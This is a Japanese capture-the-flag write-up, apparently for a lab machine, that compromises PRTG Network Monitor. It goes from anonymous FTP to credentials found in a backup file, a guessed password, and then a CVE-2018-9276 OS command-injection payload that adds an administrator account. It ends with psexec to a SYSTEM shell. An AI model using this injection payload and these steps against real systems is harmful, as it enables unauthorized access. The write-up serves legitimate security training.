# 1\. Port scan

$ip=10.10.10.152

sudo nmap -sC -sV -Pn $ip

![1dfd4d44741420e55839ab10e1dbb0fa.png](../_resources/1dfd4d44741420e55839ab10e1dbb0fa.png)

![27420e565b7a11bf3adebdabf2a687bb.png](../_resources/27420e565b7a11bf3adebdabf2a687bb.png)

上記スキャン結果からFTPのパスワードが設定されていないことを確認。

user.txtをダウンロードした結果flagだった事を確認。

users.txt

ポートスキャンの内容から検知したサービスの情報と思われるものを

確認。

![51a94b536837f577c9c34c647e436b87.png](../_resources/51a94b536837f577c9c34c647e436b87.png)

https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

![b889331759fa829a866f148806fc1c00.png](../_resources/b889331759fa829a866f148806fc1c00.png)

デフォルトのインストール先がprogramdataに設定されている事を

Paessler公式ページのSUPPORTから確認。

`ls -la`

hidden属性を含めたファイルを表示

nmapで検出したサービス名と同じディレクトリを発見

`cd Paessler`

`cd ./"PRTG Network Monitor"`

バックアップデータをダウンロード

![631bd6e0a4b0f01c01dc659089242aaa.png](../_resources/631bd6e0a4b0f01c01dc659089242aaa.png)

バックアップを確認した結果

ファイル内のcredentialを表示した結果ユーザ名とパスワードを発見

![8dfe2f19e004d2edd065cd7c9bc91caa.png](../_resources/8dfe2f19e004d2edd065cd7c9bc91caa.png)

記載してるユーザ情報でログインを試したが失敗

![d1c0f3386449415d710e8c67f61322f6.png](../_resources/d1c0f3386449415d710e8c67f61322f6.png)

パスワードは PrTg@dmin2018
ではなくPrTg@dmin2019と推測

![2f6b29b3a0646ad3a86c086fafabeb40.png](../_resources/2f6b29b3a0646ad3a86c086fafabeb40.png)

ログイン成功

![53f6aee3f9146c7ff86701b83b2c3013.png](../_resources/53f6aee3f9146c7ff86701b83b2c3013.png)

[https://github.com/A1vinSmith/CVE-2018-9276を参照して](https://github.com/A1vinSmith/CVE-2018-9276%E3%82%92%E5%8F%82%E7%85%A7%E3%81%97%E3%81%A6)

攻撃を実施

setup→

Account Settings →

Notifications→

Add new Notification

![94a809760f8a5f772e7cb1af9c5decf9.png](../_resources/94a809760f8a5f772e7cb1af9c5decf9.png)

program file Demo exe notification – outfile.ps1

parameterにtest.txt;net user pentestop P3nT3st! /add;net localgroup administrators pentestop /add

既存の管理者グループにpentestopユーザとP3nT3st! の情報を追加してするコマンドをtest.txtに追加する

username prtgadmin

password PrTg@dmin2018を入力

**CVE-2018-9276**

\*\*PRTGNetworkMoniterに関する脆弱性。\*\***この脆弱性はバージョン18.2.39以前のバージョンで見つかりました。****このバージョンのPRTG管理者ウェブコンソールに管理者権限を持つ攻撃者がアクセスした場合、センサーや****通知管理シナリオで不正なパラメータを送信することで、OSコマンドインジェクションの脆弱性が悪用されます。**

![cbde80e4a400777524f6e963e918884f.png](../_resources/cbde80e4a400777524f6e963e918884f.png)

OSインジェクションを実施

作成したNotificationを実行

![bfba5762ac2138df97a5922022fc8968.png](../_resources/bfba5762ac2138df97a5922022fc8968.png)

pentestopユーザを作成

`smbmap -H 10.10.10.152 -u pentestop -p 'P3nT3st!'`

smbmapで確認した結果、管理者権限でC$に接続できる事を確認。

![1a5ec544d7e4ed8939519bb0567bac9e.png](../_resources/1a5ec544d7e4ed8939519bb0567bac9e.png)

`python3 psexec.py 'pentestop:P3nT3st!@10.10.10.152'`

![95ee0d18ab01d774214508f076c59022.png](../_resources/95ee0d18ab01d774214508f076c59022.png)

rootを取得

![6a5c94e8da760a84627b33b47e9202c2.png](../_resources/6a5c94e8da760a84627b33b47e9202c2.png)